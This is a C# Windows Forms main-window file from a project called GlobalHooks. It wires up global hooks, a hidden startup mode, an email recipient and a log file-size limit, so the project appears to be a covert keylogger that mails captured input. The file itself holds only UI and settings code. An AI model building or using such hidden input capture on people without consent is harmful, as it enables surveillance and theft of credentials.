using System;
using System.Threading;
using System.Windows.Forms;
using GlobalHooks.Controllers;
using GlobalHooks.Model;

namespace GlobalHooks.View
{
    public partial class MainWindow : Form
    {
        private readonly ConfigurationInfo _configuration;
        private readonly GlobalHooksController _hooksController;
        private readonly ConfigurationFileController _configurationFileController = new ConfigurationFileController();
        private bool _advansedSettingsEnable = true;
        private bool _hide;

        public MainWindow()
        {
            InitializeComponent();
            _configuration = _configurationFileController.ReadFromFile();
            _hooksController = new GlobalHooksController(_configuration);
            _hooksController.ShowWindow += MainWindowShow;
            _hooksController.ShowAdvancedSettings += ShowAdvancedSettings;
        }

        private void btSettings_Click(object sender, EventArgs e)
        {
            InitializeGroupBoxSettings();
            gbSettings.Visible = true;
        }

        private void btHide_Click(object sender, EventArgs e)
        {
            _hide = true;
            Hide();
        }

        private void btSave_Click(object sender, EventArgs e)
        {
            if (!new EmailController().IsValidEmail(tbEmail.Text))
            {
                MessageBox.Show(@"Неверный формат email", @"Ошибка");
                return;
            }
            UpdateConfiguration();
            SaveConfiguration(null, null);
            gbSettings.Visible = false;
        }

        private void btAbort_Click(object sender, EventArgs e)
        {
            gbSettings.Visible = false;
        }

        private void MainWindow_Shown(object sender, EventArgs e)
        {
            _hide = _configuration.HiddenMode;
            if (_configuration.HiddenMode)
            {
                Hide();
            }
        }

        private void MainWindowShow()
        {
            _hide = false;
            Show();
        }

        private void ShowAdvancedSettings()
        {
            if(!_advansedSettingsEnable) return;
            _advansedSettingsEnable = false;
            if(!_hide)
                Hide();
            var advansedSettingsWindow = new AdvansedSettingsWindow(_configuration);
            advansedSettingsWindow.Closed += SaveConfiguration;
            advansedSettingsWindow.Show();
        }

        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            Hide();
            var thread = new Thread(_hooksController.Close);
            thread.Start();
            while (thread.IsAlive)
            {
                Thread.Sleep(10);
            }
        }

        private void InitializeGroupBoxSettings()
        {
            cbHide.Checked = _configuration.HiddenMode;
            tbEmail.Text = _configuration.To;
            numUDFileSize.Value = _configuration.FileSize > 0 ? _configuration.FileSize : 1;
        }

        private void UpdateConfiguration()
        {
            _configuration.HiddenMode = cbHide.Checked;
            _configuration.To = tbEmail.Text;
            _configuration.FileSize = (long)numUDFileSize.Value;
            _configurationFileController.SaveToFile(_configuration);
        }

        private void SaveConfiguration(object sender, EventArgs e)
        {
            if(!_hide)
                Show();
            _configurationFileController.SaveToFile(_configuration);
            _advansedSettingsEnable = true;
        }
    }
}